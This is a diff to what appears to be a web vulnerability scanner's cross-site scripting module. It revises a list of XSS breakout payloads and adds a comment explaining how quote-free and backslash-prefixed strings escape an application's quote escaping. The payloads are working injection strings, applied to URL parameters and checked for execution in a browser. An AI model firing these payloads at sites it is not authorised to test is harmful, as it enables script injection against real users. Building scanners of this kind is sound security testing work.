@@ -124,13 +124,19 @@ def classify(url: str, param: str, canary: str, sig: dict) -> list:
 
 
 # XSS breakout payloads: HTML-context + JS-string-context (plain + backslash bypass). %C% -> canary.
+# The JS-string breakouts that call print() are QUOTE-FREE on purpose: when the app escapes ' -> \' a
+# payload with inner quotes (alert('x')) gets its own quotes escaped and the breakout dies. print() is
+# hooked (sets __hit) so no argument/quote is needed — this is what lands the backslash-escaping context
+# (Gemini's Vector A: a leading \ escapes the app's escaping backslash, freeing the quote).
 _XSS_PAYLOADS = (
-    '"><img src=x onerror=alert(%C%)>',
-    "'><img src=x onerror=alert(%C%)>",
-    "</script><img src=x onerror=alert(%C%)>",
-    "';alert(%C%)//",
-    "\\';alert(%C%)//",
-    '";alert(%C%)//',
+    '"><img src=x onerror=alert(/%C%/)>',
+    "'><img src=x onerror=alert(/%C%/)>",
+    "</script><img src=x onerror=alert(/%C%/)>",
+    "\\';alert(/%C%/)//",
+    "\\\";alert(/%C%/)//",
+    "';alert(/%C%/)//",
+    "\";alert(/%C%/)//",
+    "'-alert(/%C%/)-'",
 )
 
 
@@ -160,7 +166,7 @@ def trace_param(url: str, param: str, browser_url=None) -> list:
     # XSS pass — only worth trying execution where the canary already reflects into the DOM
     if reflected:
         for pl in _XSS_PAYLOADS[:5]:
-            u = set_param(url, param, pl.replace("%C%", "'" + canary + "'"))
+            u = set_param(url, param, pl.replace("%C%", canary))
             rx = _trace(u, canary, browser_url) or {}
             if rx.get("executed"):
                 hits.insert(0, {"family": "dom_xss", "param": param, "target": u, "canary": canary,
